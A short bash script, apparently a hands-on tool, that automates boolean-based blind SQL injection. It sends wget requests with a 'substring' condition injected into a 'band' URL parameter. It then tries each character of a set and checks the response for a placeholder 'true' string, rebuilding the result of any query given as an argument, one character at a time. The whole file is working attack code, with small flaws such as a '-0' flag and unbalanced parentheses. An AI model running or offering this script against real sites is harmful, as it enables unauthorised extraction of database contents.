#!/bin/bash
#blind3.sh

charset='echo {0..9} {A..z} \. \: \, \; \- \_ \@'

export URL="http://[ENTER IN HERE]"
export truestring="We worked with them in the past [ENTER HERE]"
export maxlength=$1
export query=$2

export result=""

for ((j=1;j<$maxlength;j+=1))
do
	export nthchar=$j

	for i in $charset
	do 
		wget "$URL?band=the offspring' and substring($query),$nthchar,1)='$i" -q -0 - | grep "$truestring" &> /dev/null
		if  [ "$?" == "0" ]
		then
			echo Character number $nthchar found: $i
			export result+=$i
			break
		fi
	done
done

echo Result: $result